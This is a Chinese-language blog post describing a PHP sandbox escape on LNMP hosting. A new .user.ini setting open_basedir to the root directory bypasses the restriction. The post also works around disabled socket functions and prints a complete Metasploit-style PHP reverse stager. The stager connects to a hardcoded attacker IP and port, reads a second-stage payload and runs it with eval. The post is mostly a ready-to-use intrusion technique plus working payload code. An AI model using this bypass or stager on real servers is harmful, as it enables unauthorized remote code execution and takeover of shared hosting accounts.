---
layout: post
title: LNMP虚拟主机PHP沙盒逃逸
---

{{ page.title }}
================
<p class="date">{{ page.date | date_to_string }} - Tr3jer_CongRong</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;并不只是针对Lnmp的沙盒逃逸，而是.user.ini的设计缺陷达到绕过open_basedir限制，所以是通用的方法。首先来看看最新版LNMP是怎么配置open_basedir的：

    open_basedir=/home/wwwroot/default:/tmp/:/proc/

    lsattr .user.ini
    ----i----------- .user.ini

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LNMP的open_basedir是通过.user.ini来配置的。再来看disable_functions都禁用了哪些函数：

    lnmp1.3/include/php.sh

<img src="http://pfr2vvlbk.bkt.clouddn.com/5ethrdfb.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意到了stream_socket_server被禁用了。这个是用来建立Socket服务端的，完全可以使用其他可创建socket服务端的函数进行反弹个socket会话，比如socket_create、 fsockopen。不过虽是可以建立socket会话，但group为www，所以这个留在后面结合使用。

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.user.ini是不允许增删改的，那怎样能突破限制？.user.ini只在当前目录生效了。那么我们可不可以写入新的.user.ini并且不与原.user.ini冲突，将其open_basedir指向根目录？可以的。


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先创建一个目录并写入新的.user.ini。新的.user.ini需要1-3min来生效。

    open_basedir=/

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后结合socket，使用msf在新目录生成个反向代理payload并稍加更改就可以了。

    <?php
    error_reporting(0);
    
    $ip = '192.168.137.67';
    $port = 4444;
    $ipf = AF_INET;
    if (FALSE !== strpos($ip, ":")) {
    	$ip = "[". $ip ."]";
    	$ipf = AF_INET6;
    }
    if (($f = 'fsockopen') && is_callable($f)) {
    	$s = $f($ip, $port);
    	$s_type = 'stream';
    } elseif (($f = 'socket_create') && is_callable($f)) {
    	$s = $f($ipf, SOCK_STREAM, SOL_TCP);
    	$res = @socket_connect($s, $ip, $port);
    	if (!$res) {
    		die(); 
    	}
    	$s_type = 'socket';
    } else {
    	die('no socket funcs');
    }
    if (!$s) {
    	die('no socket');
    }
    
    switch ($s_type) {
    	case 'stream': $len = fread($s, 4); break;
    	case 'socket': $len = socket_read($s, 4); break;
    }
    
    if (!$len) {
    	die();
    }
    
    $a = unpack("Nlen", $len); $len = $a['len'];
    $b = '';
    while (strlen($b) < $len) {
    	switch ($s_type) {
    		case 'stream': $b .= fread($s, $len-strlen($b)); break;
    		case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
    	}
    }
    $GLOBALS['msgsock'] = $s;
    $GLOBALS['msgsock_type'] = $s_type;
    eval($b);
    die();
    ?>

<img src="http://pfr2vvlbk.bkt.clouddn.com/rsd.png">